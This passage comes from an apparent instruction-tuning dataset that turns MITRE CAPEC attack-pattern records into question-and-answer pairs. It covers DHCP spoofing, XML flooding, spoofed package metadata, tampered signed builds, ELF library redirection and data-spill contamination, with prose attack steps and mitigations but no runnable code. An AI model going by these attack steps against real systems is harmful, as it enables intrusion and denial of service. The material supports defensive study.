        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "194"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "158"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "94"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Exsisting DHCP lease] An adversary observes network traffic and waits for an existing DHCP lease to expire on a target machine in the LAN.",
              "Technique": "Adversary observes LAN traffic for DHCP solicitations"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Capture the DHCP DISCOVER message] The adversary captures \"DISCOVER\" messages and crafts \"OFFER\" responses for the identified target MAC address. The success of this attack centers on the capturing of and responding to these \"DISCOVER\" messages.",
              "Technique": "Adversary captures and responds to DHCP \"DISCOVER\" messages tailored to the target subnet."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Compromise Network Access and Collect Network Activity] An adversary successfully acts as a rogue DHCP server by redirecting legitimate DHCP requests to itself.",
              "Technique": "Adversary sends repeated DHCP \"REQUEST\" messages to quickly lease all the addresses within network's DHCP pool and forcing new DHCP requests to be handled by the rogue DHCP server."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have access to a machine within the target LAN which can send DHCP offers to the target."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary must identify potential targets for DHCP Spoofing and craft network configurations to obtain the desired results."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires access to a machine within the target LAN on a network which does not secure its DHCP traffic through MAC-Forced Forwarding, port security, etc."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Integrity",
                "Access Control"
              ],
              "Impact": [
                "Modify Data",
                "Execute Unauthorized Commands"
              ]
            },
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: MAC-Forced Forwarding",
            "Implementation: Port Security and DHCP snooping",
            "Implementation: Network-based Intrusion Detection Systems"
          ]
        },
        "Example_Instances": {
          "Example": "In early 2019, Microsoft patched a critical vulnerability (CVE-2019-0547) in the Windows DHCP client which allowed remote code execution via crafted DHCP OFFER packets. [REF-739]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "923"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1557.003",
            "Entry_Name": "Adversary-in-the-Middle: DHCP Spoofing"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-737"
            },
            {
              "@External_Reference_ID": "REF-738"
            },
            {
              "@External_Reference_ID": "REF-739"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2022-09-29"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: XML Ping of the Death (CAPEC ID: 147), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.",
      "@Name": "XML Ping of the Death (CAPEC ID: 147)",
      "attack_ptrn": {
        "@ID": "147",
        "@Name": "XML Ping of the Death",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "528"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.",
              "Technique": [
                "Use an automated tool to record all instances of URLs to process XML requests.",
                "Use a browser to manually explore the website and analyze how the application processes XML requests."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.",
              "Technique": "Send a large number of crafted small XML messages to the target URL."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target must receive and process XML transactions."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To send small XML messages"
            },
            {
              "@Level": "High",
              "#text": "To use distributed network to launch the attack"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Resource Consumption",
            "Note": "DoS: resource consumption (other)"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.",
            "Implementation: Provide for network flow control and traffic shaping to control access to the resources."
          ]
        },
        "Example_Instances": {
          "Example": "Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "400"
            },
            {
              "@CWE_ID": "770"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2018-07-31",
            "Modification_Comment": "Updated Solutions_and_Mitigations"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Spoof Open-Source Software Metadata (CAPEC ID: 691)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: An adversary provides a malicious open-source library, claiming to provide extended logging features and functionality, and spoofs the metadata with that of a widely used legitimate library. The adversary then tricks victims into including this library in their underlying application. Once the malicious software is incorporated into the application, the adversary is able to manipulate and exfiltrate log data.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary provides a malicious open-source library, claiming to provide extended logging features and functionality, and spoofs the metadata with that of a widely used legitimate library. The adversary then tricks victims into including this library in their underlying application. Once the malicious software is incorporated into the application, the adversary is able to manipulate and exfiltrate log data.",
      "@Name": "Spoof Open-Source Software Metadata (CAPEC ID: 691)",
      "attack_ptrn": {
        "@ID": "691",
        "@Name": "Spoof Open-Source Software Metadata",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary spoofs open-source software metadata in an attempt to masquerade malicious software as popular, maintained, and trusted."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Due to open-source software's popularity, it serves as a desirable attack-vector for adversaries since a single malicious component may result in the exploitation of numerous systems/applications. Adversaries may, therefore, spoof the metadata pertaining to the open-source software in order to trick victims into downloading and using their malicious software. Examples of metadata that may be spoofed include:",
            "Once the malicious software component has been integrated into an underlying application or executed on a system, the adversary is ultimately able to achieve numerous negative technical impacts within the system/application. This often occurs without any indication of compromise."
          ],
          "xhtml:ul": {
            "xhtml:li": [
              "Owner of the software (e.g., repository or package owner)",
              "Author(s) of repository commits",
              "Frequency of repository commits",
              "Date/Time of repository commits",
              "Package or Repository \"stars\""
            ]
          }
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "690"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "184"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "444"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "630"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Identification of a popular open-source component whose metadata is to be spoofed."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Ability to spoof a variety of software metadata to convince victims the source is trusted."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Accountability",
              "Impact": "Hide Activities"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Execute Unauthorized Commands",
                "Alter Execution Logic",
                "Gain Privileges"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Before downloading open-source software, perform precursory metadata checks to determine the author(s), frequency of updates, when the software was last updated, and if the software is widely leveraged.",
            "Within package managers, look for conflicting or non-unique repository references to determine if multiple packages share the same repository reference.",
            "Reference vulnerability databases to determine if the software contains known vulnerabilities.",
            "Only download open-source software from reputable hosting sites or package managers.",
            "Only download open-source software that has been adequately signed by the developer(s). For repository commits/tags, look for the \"Verified\" status and for developers leveraging \"Vigilant Mode\" (GitHub) or similar modes.",
            "After downloading open-source software, ensure integrity values have not changed.",
            "Before executing or incorporating the software, leverage automated testing techniques (e.g., static and dynamic analysis) to determine if the software behaves maliciously."
          ]
        },
        "Example_Instances": {
          "Example": "An adversary provides a malicious open-source library, claiming to provide extended logging features and functionality, and spoofs the metadata with that of a widely used legitimate library. The adversary then tricks victims into including this library in their underlying application. Once the malicious software is incorporated into the application, the adversary is able to manipulate and exfiltrate log data."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1195.001",
              "Entry_Name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1195.002",
              "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2022-09-29"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Developer Signing Maliciously Altered Software (CAPEC ID: 673)",
    "context": "",
    "output": "Examples of Developer Signing Maliciously Altered Software (CAPEC ID: 673) are: An adversary who has infiltrated an organization\u2019s build environment maliciously alters code intended to be included in a product\u2019s software build via software dependency inclusion, part of the software build process. When the software product has been built, the developer electronically signs the finished product using their signing key. The recipient of the software product, an end user/customer, believes the software to reflect the developer\u2019s intent with respect to functionality unaware of the adversary\u2019s malicious intent harbored within.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary who has infiltrated an organization\u2019s build environment maliciously alters code intended to be included in a product\u2019s software build via software dependency inclusion, part of the software build process. When the software product has been built, the developer electronically signs the finished product using their signing key. The recipient of the software product, an end user/customer, believes the software to reflect the developer\u2019s intent with respect to functionality unaware of the adversary\u2019s malicious intent harbored within.",
      "@Name": "Developer Signing Maliciously Altered Software (CAPEC ID: 673)",
      "attack_ptrn": {
        "@ID": "673",
        "@Name": "Developer Signing Maliciously Altered Software",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": [
            "Software produced by a reputable developer is clandestinely infected with malicious code and then digitally signed by the unsuspecting developer, where the software has been altered via a compromised software development or build process prior to being signed. The receiver or user of the software has no reason to believe that it is anything but legitimate and proceeds to deploy it to organizational systems.",
            "This attack differs from CAPEC-206, since the developer is inadvertently signing malicious code they believe to be legitimate and which they are unware of any malicious modifications."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary would need to have access to a targeted developer\u2019s software development environment, including to their software build processes, where the adversary could ensure code maliciously tainted prior to a build process is included in software packages built."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The adversary must have the skills to infiltrate a developer\u2019s software development/build environment and to implant malicious code in developmental software code, a build server, or a software repository containing dependency code, which would be referenced to be included during the software build process."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Integrity",
                "Confidentiality"
              ],
              "Impact": [
                "Read Data",
                "Modify Data"
              ]
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Gain Privileges",
                "Execute Unauthorized Commands"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Have a security concept of operations (CONOPS) for the IDE that includes: Protecting the IDE via logical isolation using firewall and DMZ technologies/architectures; Maintaining strict security administration and configuration management of configuration management tools, developmental software and dependency code repositories, compilers, and system build tools.",
            "Employ intrusion detection and malware detection capabilities on IDE systems where feasible."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "An adversary who has infiltrated an organization\u2019s build environment maliciously alters code intended to be included in a product\u2019s software build via software dependency inclusion, part of the software build process. When the software product has been built, the developer electronically signs the finished product using their signing key. The recipient of the software product, an end user/customer, believes the software to reflect the developer\u2019s intent with respect to functionality unaware of the adversary\u2019s malicious intent harbored within."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.002",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-658"
            },
            {
              "@External_Reference_ID": "REF-659"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-09-29",
            "Modification_Comment": "Updated Taxonomy_Mappings"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Artificially Inflate File Sizes (CAPEC ID: 572), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An adversary could potentially increase file sizes on devices containing limited storage resources, such as SCADA or IOT devices, resulting in denial of service conditions.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary could potentially increase file sizes on devices containing limited storage resources, such as SCADA or IOT devices, resulting in denial of service conditions.",
      "@Name": "Artificially Inflate File Sizes (CAPEC ID: 572)",
      "attack_ptrn": {
        "@ID": "572",
        "@Name": "Artificially Inflate File Sizes",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "An adversary modifies file contents by adding data to files for several reasons. Many different attacks could \u201cfollow\u201d this pattern resulting in numerous outcomes. Adding data to a file could also result in a Denial of Service condition for devices with limited storage capacity."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "165"
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption",
              "Note": "Denial of Service"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "An adversary could potentially increase file sizes on devices containing limited storage resources, such as SCADA or IOT devices, resulting in denial of service conditions."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1027.001",
            "Entry_Name": "Obfuscated Files or Information:Binary Padding"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Description, Example_Instances, Likelihood_Of_Attack, Taxonomy_Mappings, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Redirect Access to Libraries (CAPEC ID: 159)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Redirect Access to Libraries (CAPEC ID: 159) are: In this example, the attacker using ELF infection that redirects the Procedure Linkage Table (PLT) of an executable allowing redirection to be resident outside of the infected executable. The algorithm at the entry point code is as follows... \u2022 mark the text segment writeable \u2022 save the PLT(GOT) entry \u2022 replace the PLT(GOT) entry with the address of the new lib call The algorithm in the new library call is as follows... \u2022 do the payload of the new lib call \u2022 restore the original PLT(GOT) entry \u2022 call the lib call \u2022 save the PLT(GOT) entry again (if its changed) \u2022 replace the PLT(GOT) entry with the address of the new lib call",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In this example, the attacker using ELF infection that redirects the Procedure Linkage Table (PLT) of an executable allowing redirection to be resident outside of the infected executable. The algorithm at the entry point code is as follows... \u2022 mark the text segment writeable \u2022 save the PLT(GOT) entry \u2022 replace the PLT(GOT) entry with the address of the new lib call The algorithm in the new library call is as follows... \u2022 do the payload of the new lib call \u2022 restore the original PLT(GOT) entry \u2022 call the lib call \u2022 save the PLT(GOT) entry again (if its changed) \u2022 replace the PLT(GOT) entry with the address of the new lib call",
      "@Name": "Redirect Access to Libraries (CAPEC ID: 159)",
      "attack_ptrn": {
        "@ID": "159",
        "@Name": "Redirect Access to Libraries",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "154",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "403"
                },
                {
                  "@Exclude_ID": "437"
                },
                {
                  "@Exclude_ID": "512"
                },
                {
                  "@Exclude_ID": "515"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "185"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify Target] The adversary identifies the target application and determines what libraries are being used.",
              "Technique": [
                "Find public source code and identify library dependencies.",
                "Gain access to the system hosting the application and look for libraries in common locations."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Deploy Malicious Libraries] The adversary crafts malicious libraries and deploys them on the system where the application is running, or in a remote location that can be loaded by the application."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Redirect Library Calls to Malicious Library] Once the malicious library crafted by the adversary is deployed, the adversary will manipulate the flow of the application such that it calls the malicious library. This can be done in a variety of ways based on how the application is loading and calling libraries.",
              "Technique": [
                "Poison the DNS cache of the system so that it loads a malicious library from a remote location hosted by the adversary instead of the legitimate location",
                "Create a symlink that tricks the application into thinking that a malicious library is the legitimate library.",
                "Use DLL side-loading to place a malicious verison of a DLL in the windows directory."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target must utilize external libraries and must fail to verify the integrity of these libraries before using them."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To modify the entries in the configuration file pointing to malicious libraries"
            },
            {
              "@Level": "Medium",
              "#text": "To force symlink and timing issues for redirecting access to libraries"
            },
            {
              "@Level": "High",
              "#text": "To reverse engineering the libraries and inject malicious code into the libraries"
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Restrict the permission to modify the entries in the configuration file.",
            "Implementation: Check the integrity of the dynamically linked libraries before use them.",
            "Implementation: Use obfuscation and other techniques to prevent reverse engineering the libraries."
          ]
        },
        "Example_Instances": {
          "Example": "In this example, the attacker using ELF infection that redirects the Procedure Linkage Table (PLT) of an executable allowing redirection to be resident outside of the infected executable. The algorithm at the entry point code is as follows... \u2022 mark the text segment writeable \u2022 save the PLT(GOT) entry \u2022 replace the PLT(GOT) entry with the address of the new lib call The algorithm in the new library call is as follows... \u2022 do the payload of the new lib call \u2022 restore the original PLT(GOT) entry \u2022 call the lib call \u2022 save the PLT(GOT) entry again (if its changed) \u2022 replace the PLT(GOT) entry with the address of the new lib call"
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "706"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1574.008",
            "Entry_Name": "Hijack Execution Flow:Path Interception by Search Order Hijacking"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-29"
            },
            {
              "@External_Reference_ID": "REF-30",
              "@Section": "OWASP Top 10 2007 A3 \u2013 Malicious File Execution"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Description, Description Summary, References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Contaminate Resource (CAPEC ID: 548)",
    "context": "",
    "output": "An insider threat was able to obtain a classified document. They have knowledge that a backend server which provides access to a website also runs a mail server. The adversary creates a throwaway email address and sends the classified document to the mail server. When an administrator checks the mail server they notice that it has processed an email with a classified document and the server has to be taken offline while they investigate the contamination. In the meantime, the website has to be taken down as well and access to the website is denied until the backend can be migrated to another server or the investigation is complete.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An insider threat was able to obtain a classified document. They have knowledge that a backend server which provides access to a website also runs a mail server. The adversary creates a throwaway email address and sends the classified document to the mail server. When an administrator checks the mail server they notice that it has processed an email with a classified document and the server has to be taken offline while they investigate the contamination. In the meantime, the website has to be taken down as well and access to the website is denied until the backend can be migrated to another server or the investigation is complete.",
      "@Name": "Contaminate Resource (CAPEC ID: 548)",
      "attack_ptrn": {
        "@ID": "548",
        "@Name": "Contaminate Resource",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An adversary contaminates organizational information systems (including devices and networks) by causing them to handle information of a classification/sensitivity for which they have not been authorized. When this happens, the contaminated information system, device, or network must be brought offline to investigate and mitigate the data spill, which denies availability of the system until the investigation is complete.",
        "Extended_Description": "Contamination through email is a very common attack vector. Systems with email servers or personal work systems using email are susceptible to this attack simply by receiving an email that contains a classified document or information. A fake classified document could even be used that is mistaken as true classified material. This would still cause the system to be taken offline until the validity of the classified material is confirmed.",
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "Data Spill",
            "Description": "When information is handled by an information system of a classification/sensitivity for which the system has not been authorized to handle."
          }
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "CanPrecede",
            "@CAPEC_ID": "607"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary needs to have real or fake classified/sensitive information to place on a system"
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "Knowledge of classification levels of systems"
            },
            {
              "@Level": "High",
              "#text": "The ability to obtain a classified document or information"
            },
            {
              "@Level": "Low",
              "#text": "The ability to fake a classified document"
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption",
              "Note": "Denial of Service"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "Victims of the attack can be exposed to classified materials"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Properly safeguard classified/sensitive data. This includes training cleared individuals to ensure they are handling and disposing of this data properly, as well as ensuring systems only handle information of the classification level they are designed for.",
            "Design systems with redundancy in mind. This could mean creating backing servers that could be switched over to in the event that a server has to be taken down for investigation.",
            "Have a planned and efficient response plan to limit the amount of time a system is offline while the contamination is investigated."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "An insider threat was able to obtain a classified document. They have knowledge that a backend server which provides access to a website also runs a mail server. The adversary creates a throwaway email address and sends the classified document to the mail server. When an administrator checks the mail server they notice that it has processed an email with a classified document and the server has to be taken offline while they investigate the contamination. In the meantime, the website has to be taken down as well and access to the website is denied until the backend can be migrated to another server or the investigation is complete."
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-742"
            },
            {
              "@External_Reference_ID": "REF-743"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2023-01-24",
            "Modification_Comment": "Updated Alternate_Terms, Consequences, Description, Example_Instances, Extended_Description, Likelihood_Of_Attack, Mitigations, Prerequisites, References, Related_Attack_Patterns, Skills_Required, Typical_Severity"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Server Motherboard Compromise (CAPEC ID: 677)",
    "context": "",
